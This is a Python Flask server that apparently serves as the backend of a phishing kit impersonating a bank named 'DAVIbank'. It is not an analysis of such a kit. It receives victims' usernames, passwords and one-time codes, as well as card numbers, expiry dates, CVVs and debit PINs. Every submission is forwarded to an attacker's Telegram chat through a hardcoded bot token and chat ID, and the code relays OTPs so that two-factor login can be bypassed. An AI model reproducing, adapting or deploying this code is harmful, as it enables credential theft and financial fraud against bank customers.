from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from datetime import datetime
import threading
import time

BOT_TOKEN = '8144392743:AAF0qG5TnvlhYcGZdlz7f3rwLpMBw3rXvqQ'
ADMIN_CHAT_ID = '6434195233'
PORT = 3000

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

pending_validations = {}  # Stores OTP and validation status
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = 0

@app.route('/api/submit', methods=['POST', 'OPTIONS'])
def submit_login():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    username = data.get('username')
    password = data.get('password')
    otp = data.get('otp')
    
    print(f"[{datetime.now()}] 📥 Login: {user_id} - {username} - OTP: {otp}")
    
    pending_validations[user_id] = {
        'username': username,
        'password': password,
        'otp': otp,
        'status': 'pending',
        'timestamp': datetime.now().isoformat()
    }
    
    message = (f"🔐 **CÓDIGO DE VERIFICACIÓN** 🔐\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"🆔 ID: `{user_id}`\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"📋 **DATOS DE ACCESO**\n"
               f"👤 Usuario: {username}\n"
               f"🔑 Contraseña: {password}\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"🔢 **CÓDIGO OTP:** `{otp}`\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"⚠️ Comparta este código con el usuario para que ingrese")
    
    requests.post(f"{TELEGRAM_API}/sendMessage",
        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown"})
    
    return jsonify({"success": True})

@app.route('/api/verify-otp', methods=['POST', 'OPTIONS'])
def verify_otp():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    user_otp = data.get('otp')
    
    if user_id in pending_validations:
        stored_otp = pending_validations[user_id]['otp']
        if stored_otp == user_otp:
            pending_validations[user_id]['status'] = 'validated'
            print(f"[{datetime.now()}] ✅ OTP verified for {user_id}")
            return jsonify({"valid": True})
    
    return jsonify({"valid": False})

@app.route('/api/resend-otp', methods=['POST', 'OPTIONS'])
def resend_otp():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    username = data.get('username')
    password = data.get('password')
    new_otp = data.get('otp')
    
    if user_id in pending_validations:
        pending_validations[user_id]['otp'] = new_otp
        
        message = (f"🔄 **NUEVO CÓDIGO OTP** 🔄\n\n"
                   f"🆔 ID: `{user_id}`\n"
                   f"👤 Usuario: {username}\n"
                   f"🔢 **Nuevo código:** `{new_otp}`")
        
        requests.post(f"{TELEGRAM_API}/sendMessage",
            json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown"})
    
    return jsonify({"success": True})

@app.route('/api/check/<user_id>', methods=['GET', 'OPTIONS'])
def check_validation(user_id):
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    if user_id in pending_validations:
        return jsonify({"validated": pending_validations[user_id]['status'] == 'validated'})
    return jsonify({"validated": False})

@app.route('/api/card', methods=['POST', 'OPTIONS'])
def submit_card():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    message = (f"💳 **DATOS DE TARJETA** 💳\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"👤 Usuario: {data.get('username')}\n"
               f"🔑 Contraseña: {data.get('password')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"💳 Tarjeta: {data.get('cardNumber')}\n"
               f"📅 Expira: {data.get('expiry')}\n"
               f"🔐 CVV: {data.get('cvv')}\n"
               f"🏧 PIN: {data.get('debitPin')}")
    
    requests.post(f"{TELEGRAM_API}/sendMessage",
        json={"chat_id": ADMIN_CHAT_ID, "text": message})
    
    return jsonify({"success": True})

@app.route('/health', methods=['GET', 'OPTIONS'])
def health():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    return jsonify({"status": "ok", "pending": len(pending_validations)})

def poll_telegram():
    global last_update_id
    while True:
        try:
            url = f"{TELEGRAM_API}/getUpdates"
            params = {"timeout": 30}
            if last_update_id:
                params["offset"] = last_update_id + 1
            
            response = requests.get(url, params=params, timeout=35)
            updates = response.json()
            
            if updates.get('ok') and updates.get('result'):
                for update in updates['result']:
                    last_update_id = update['update_id']
                    
                    if 'message' in update:
                        message = update['message']
                        chat_id = message['chat']['id']
                        text = message.get('text', '')
                        
                        if text == '/start':
                            welcome = ("🤖 Bot de validación DAVIbank\n\n"
                                      "Los usuarios serán notificados aquí con códigos OTP.\n\n"
                                      "Comandos:\n/status - Ver estado")
                            requests.post(f"{TELEGRAM_API}/sendMessage",
                                json={"chat_id": chat_id, "text": welcome})
                        
                        elif text == '/status':
                            requests.post(f"{TELEGRAM_API}/sendMessage",
                                json={"chat_id": chat_id, "text": f"📊 Pendientes: {len(pending_validations)}"})
        
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)

if __name__ == '__main__':
    print("\n" + "="*50)
    print("DAVIbank Bot Starting...")
    print("="*50)
    
    poll_thread = threading.Thread(target=poll_telegram, daemon=True)
    poll_thread.start()
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
